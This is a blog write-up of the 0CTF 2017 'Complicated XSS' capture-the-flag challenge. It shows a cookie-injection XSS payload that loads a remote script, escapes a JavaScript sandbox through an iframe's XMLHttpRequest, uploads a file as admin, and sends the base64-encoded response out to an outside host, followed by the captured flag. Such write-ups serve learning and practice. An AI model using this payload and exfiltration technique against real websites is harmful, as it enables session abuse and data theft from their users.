+++
date = "2017-03-20T10:14:18-07:00"
title = "0CTF 2017 - Complicated XSS"
tags = ["CTF", "Web", "XSS"]
+++

Cookies Monster...

<!--more-->

# Problem

> Does this look familiar?  
> http://government.vip/
> <hr />
> XSS Book
>
> The flag is in http://admin.government.vip:8000  
> Bruteforce and scanning are not needed!  
> Admin will be hit by your payload

# Solution

Login to admin page with pre-populated test account, we can see there are two cookies: `username` and `session`, and the
page says "only admin can upload shell".  Seems like we need to XSS admin to upload something.  The `session` cookie is
an HTTP cookie that cannot be accessed by script.  The `username` cookie however, is an XSS point.  Server reads `username`
cookie content and displayed it as raw HTML.

Now comes the tricky part: in the document header of admin page, some core component is stripped out.  Making AJAX call
will fail since there's no `XMLHttpRequest`.  I also tried [Fetch API][1] which works locally but server's browser
doesn't support it.

```html
<script>
//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</script>
```

Poking around and I found out that the embedded `iframe` element still have `XMLHttpRequest`.

Another trick that blocked me for quite a while is that the admin page only renders upload form if `username` cookie is
"admin".  So we need to reset cookie and fetch admin page again to see what parameters are needed for upload.
Otherwise, it keeps hitting `400: bad request`.

```html
<h1>Hello admin</h1>

<p>Upload your shell</p>
<form action="/upload" method="post" enctype="multipart/form-data">
<p><input type="file" name="file"></input></p>
<p><input type="submit" value="upload">
</form>
```

Here's the XSS payload.

```javascript
document.cookie="username=<iframe></iframe><script src='http://.../a.js'></script>;path=/;domain=.government.vip";
window.location="http://admin.government.vip:8000";
```

a.js

```javascript
document.cookie="username=admin";

var xhr = new frames[0].XMLHttpRequest;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    var result = xhr.responseText;
    result += ",";
    result += xhr.status;
    result += ",";
    result += xhr.getAllResponseHeaders();
    window.location="http://.../?a=" + btoa(result);
  }
}

xhr.open('POST', '/upload', true);

var fblob = new Blob(["any content here"]);
var formData = new FormData();
formData.append("file", fblob);

xhr.send(formData);
```

Decoded response:

```
flag{xss_is_fun_2333333},200,Server: TornadoServer/4.4.2
Content-Length: 24
Content-Type: text/html; charset=utf-8
```

[1]: https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API
